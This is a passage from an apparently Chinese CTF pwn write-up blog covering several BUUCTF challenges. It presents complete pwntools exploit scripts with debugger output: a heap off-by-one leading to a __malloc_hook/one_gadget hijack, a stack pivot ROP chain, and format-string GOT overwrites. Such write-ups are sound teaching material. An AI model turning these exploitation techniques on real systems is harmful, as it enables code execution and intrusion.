class="line">0x555555757140:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757150:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757160:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757170:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757180:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757190:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>之后：</p><p><code>write(0, 0x58 + 0xa, &#39;a&#39;* 0x58 + &#39;\xe1&#39;)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/60gx 0x555555757000</span></span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757010:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757020:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757030:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757060:0x61616161616161610x00000000000000e1 &lt;=注意这里</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570d0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557570e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757100:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757140:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757150:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757160:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757170:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757180:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757190:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>然后drop掉idx1，这样的话idx1和2都会进入bin中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line"><span class="comment">#这样会把fd和bk指针打出来</span></span><br><span class="line"></span><br><span class="line">libc_base = address -  <span class="number">0x3c4b20</span> - <span class="number">0x58</span></span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br></pre></td></tr></table></figure><p>show的地址是 unsorted bin 链表的头部，跟 main_arena 的偏移固定 0x58，同时 main_arena 跟 libc 的偏移可以通过工具计算出来 <a href="https://github.com/bash-c/main_arena_offset">https://github.com/bash-c/main_arena_offset</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/main_arena_offset$ ./main_arena ../Desktop/libc-2.23.so </span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=9a6b57c7a4f93d7e54e61bccb7df996c8bc58141</span><br><span class="line">[+]main_arena_offset : 0x1b0780</span><br><span class="line">gwt@ubuntu:~/main_arena_offset$ ./main_arena /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=30773be8cf5bfed9d910c8473dd44eaab2e705ab</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (on 2&#x27;s address)</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>, <span class="number">0x8</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (2)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#6 fake chunk</span></span><br><span class="line">realloc_addr=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span> + p64(one_gadget + libc_base) + p64(realloc_addr)</span><br><span class="line">write(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25955</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop</span>(<span class="params">index</span>):</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  cmd(<span class="number">4</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">0xa</span>, <span class="string">&#x27;a&#x27;</span>* <span class="number">0x58</span> + <span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = address -  <span class="number">0x3c4b20</span> - <span class="number">0x58</span></span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (on 2&#x27;s address)</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>, <span class="number">0x8</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 = 2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#6 fake chunk</span></span><br><span class="line">realloc_addr=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span> + p64(one_gadget + libc_base) + p64(realloc_addr)</span><br><span class="line">write(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x33-gyctf-2020-borrowstack"><a href="#0x33-gyctf-2020-borrowstack" class="headerlink" title="0x33.gyctf_2020_borrowstack"></a>0x33.gyctf_2020_borrowstack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[<span class="number">96</span>]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x70uLL);</span><br><span class="line">  puts(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, 0x100uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有其他函数。</p><p>第一次read 的大小恰好可以覆写ret地址。</p><p>迁移栈到bss段，然后第二个read写rop，在之后执行onegadget。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./gyctf_2020_borrowstack&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29529</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_borrowstack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">ret = <span class="number">0x4004c9</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = p64(ret) * <span class="number">20</span> + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">&#x27;A&#x27;</span>+ p64(base + one_gadget)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x34-axb-2019-fmt32"><a href="#0x34-axb-2019-fmt32" class="headerlink" title="0x34.axb_2019_fmt32"></a>0x34.axb_2019_fmt32</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./axb_2019_fmt32 </span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I&#x27;ll answer whatever you say!</span><br><span class="line">Please tell me:aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</span><br><span class="line">Repeater:aaaaa0x804888d.0xffffce5f.0xf7ffd53c.0xffffce68.0xf7fd95c5.0x46.0x61ffcf54.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.</span><br></pre></td></tr></table></figure><p>输入一串a测试下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 24</span></span><br><span class="line">00:0000│ esp    0xffffce3c —▸ 0x8048700 (main+261) ◂— add    esp, 0x10</span><br><span class="line">01:0004│        0xffffce40 —▸ 0xffffcf60 ◂— 0x0</span><br><span class="line">02:0008│        0xffffce44 —▸ 0x804888d ◂— push   edx /* &#x27;Repeater:%s\n&#x27; */</span><br><span class="line">03:000c│        0xffffce48 —▸ 0xffffce5f ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">04:0010│        0xffffce4c —▸ 0xf7ffd53c (_rtld_global+1308) —▸ 0xf7fd9000 ◂— jg     0xf7fd9047</span><br><span class="line">05:0014│        0xffffce50 —▸ 0xffffce68 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">06:0018│        0xffffce54 —▸ 0xf7fd95c5 ◂— jb     0xf7fd962c /* &#x27;realloc&#x27; */</span><br><span class="line">07:001c│        0xffffce58 ◂— 0x0</span><br><span class="line">08:0020│ ecx-3  0xffffce5c ◂— 0x61ffcf54</span><br><span class="line">09:0024│        0xffffce60 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">0f:003c│        0xffffce78 ◂— 0x6161 /* &#x27;aa&#x27; */</span><br><span class="line">10:0040│        0xffffce7c ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line">第一个参数表示格式化字符串的偏移；</span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为0x2223322</span><br><span class="line">第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">fmtstr_payload函数返回的就是payload</span><br></pre></td></tr></table></figure><p>具体可以去看：<a href="https://docs.pwntools.com/en/stable/fmtstr.html">https://docs.pwntools.com/en/stable/fmtstr.html</a></p><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./axb_2019_fmt32&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26417</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">prt_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>+p32(prt_got)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%8$s&quot;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line">base  = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x3a80c</span> +base</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;prt_got:one_gadget&#125;,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;cat flag\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./axb_2019_fmt32&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26417</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">prt_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>+p32(prt_got)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%8$s&quot;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line">base  = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x3ac72</span> +base</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;prt_got:system_add&#125;,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;;cat flag\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x35-others-babystack"><a href="#0x35-others-babystack" class="headerlink" title="0x35.others_babystack"></a>0x35.others_babystack</h1><p>查看保护：开了canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec babystack </span><br><span class="line">[*] <span 